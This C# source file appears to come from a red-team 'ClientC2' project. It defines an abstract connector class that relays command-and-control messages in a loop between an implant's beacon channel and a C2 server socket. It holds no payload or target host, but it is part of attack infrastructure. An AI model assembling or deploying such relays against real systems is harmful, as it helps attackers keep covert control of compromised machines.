using System;
using System.Threading;
using ClientC2.interfaces;

namespace ClientC2.connectors
{
    public abstract class BaseConnector
    {
        /// <summary>
        ///     Create a connector using the specified channels
        /// </summary>
        /// <param name="beaconChannel"></param>
        /// <param name="serverChannel"></param>
        /// <param name="sleep"></param>
        protected BaseConnector(IC2Channel beaconChannel, IC2Channel serverChannel, int sleep)
        {
            BeaconChannel = beaconChannel;
            ServerChannel = serverChannel;
            Sleep = sleep;
        }

        /// <summary>
        ///     Determines if the current process is 64bit
        /// </summary>
        public bool Is64Bit => IntPtr.Size == 8;

        /// <inheritdoc />
        /// <summary>
        ///     Returns whether the Connector has been started or not
        /// </summary>
        public bool Started { get; private set; }

        /// <summary>
        ///     The channel used for communicating with the beacon
        /// </summary>
        public IC2Channel BeaconChannel { get; protected set; }

        /// <summary>
        ///     The channel used for communication with the server
        /// </summary>
        public IC2Channel ServerChannel { get; protected set; }

        /// <summary>
        ///     The amount of time in milliseconds between messages
        /// </summary>
        public int Sleep { get; protected set; }

        /// <summary>
        ///     The initialization method implemented by the inheriting connection
        /// </summary>
        public abstract Func<bool> Initialize { get; }

        /// <summary>
        ///     The main function for relaying C2 communications
        /// </summary>
        /// <exception cref="T:System.Exception"></exception>
        public void Go()
        {
            try
            {
                if (!Initialize())
                    throw new Exception("C2 connector was not initialized...");

                if (!ServerChannel.Connected)
                    throw new Exception("Server Channel is not connected");

                if (!BeaconChannel.Connected)
                    throw new Exception("Beacon Channel is not connected");

                Started = true;
                while (true)
                {
                    if (!BeaconChannel.ReadAndSendTo(ServerChannel)) break;
                    if (!ServerChannel.ReadAndSendTo(BeaconChannel)) break;
                    Thread.Sleep(Sleep);
                }
                Console.WriteLine("[!] Stopping loop, no bytes received");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Exception occured: {ex.Message}");
            }
            finally
            {
                Stop();
            }
        }

        /// <summary>
        ///     Sets the started boolean to false and disconnects the underlying channels
        /// </summary>
        public void Stop()
        {
            Started = false;

            Console.WriteLine("[-] Closing pipe connection");
            BeaconChannel?.Close();

            Console.WriteLine("[-] Closing socket connection");
            ServerChannel?.Close();
        }
    }
}
